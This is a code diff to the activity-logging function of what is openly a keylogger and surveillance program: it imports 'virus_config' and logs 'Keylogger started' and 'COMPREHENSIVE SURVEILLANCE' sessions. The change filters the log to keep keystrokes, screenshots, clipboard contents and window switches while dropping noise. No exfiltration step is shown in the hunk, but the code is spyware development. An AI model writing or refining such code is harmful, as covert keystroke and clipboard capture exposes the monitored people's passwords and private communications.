@@ -9,7 +9,40 @@ import json
 from virus_config import *
 
 def log_activity(activity_type, details):
-    """Log comprehensive user activity to keyboard_log.txt (merged log)"""
+    """Log comprehensive user activity to keyboard_log.txt (merged log) - FILTERED"""
+    # Only log useful activity types: WINDOW, SCREENSHOT, key presses (EVDEV/PYNPUT), SYSTEM (important only), CLIPBOARD
+    useful_types = {
+        'WINDOW', 'SCREENSHOT', 'EVDEV', 'PYNPUT', 'CLIPBOARD',
+        'SYSTEM', 'APPLICATION'  # SYSTEM and APPLICATION for important events only
+    }
+    
+    # Filter SYSTEM logs - only keep important ones
+    if activity_type == 'SYSTEM':
+        important_keywords = [
+            'CPU:', 'Memory:', 'Disk:', 'Network connections:',
+            'Screenshot saved:', 'Keylogger started', 'Keylogger monitoring',
+            'Surveillance Session', 'COMPREHENSIVE SURVEILLANCE'
+        ]
+        if not any(keyword in details for keyword in important_keywords):
+            return  # Skip non-important SYSTEM logs
+    
+    # Filter APPLICATION logs - only keep window switches
+    if activity_type == 'APPLICATION':
+        if 'Switched to:' not in details:
+            return  # Skip non-window-switch APPLICATION logs
+    
+    # Skip ERROR logs (too verbose)
+    if activity_type == 'ERROR':
+        return
+    
+    # Skip MOUSE logs (too verbose)
+    if activity_type == 'MOUSE':
+        return
+    
+    # Skip other non-useful types
+    if activity_type not in useful_types:
+        return
+    
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
     log_entry = f"[{timestamp}] [{activity_type}] {details}\n"
     
